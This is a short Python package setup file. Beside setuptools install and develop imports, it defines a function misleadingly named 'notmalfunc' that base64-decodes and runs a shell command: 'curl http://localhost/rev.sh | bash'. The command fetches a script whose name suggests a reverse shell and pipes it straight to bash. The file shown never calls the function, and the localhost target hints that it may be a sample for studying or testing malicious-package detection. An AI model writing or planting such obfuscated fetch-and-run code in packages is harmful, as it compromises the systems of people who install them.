import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os


def b64d(base64_code):
    base64_bytes = base64_code.encode("ascii")
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode("ascii")
    return code


def notmalfunc():
    os.system(b64d("Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK"))
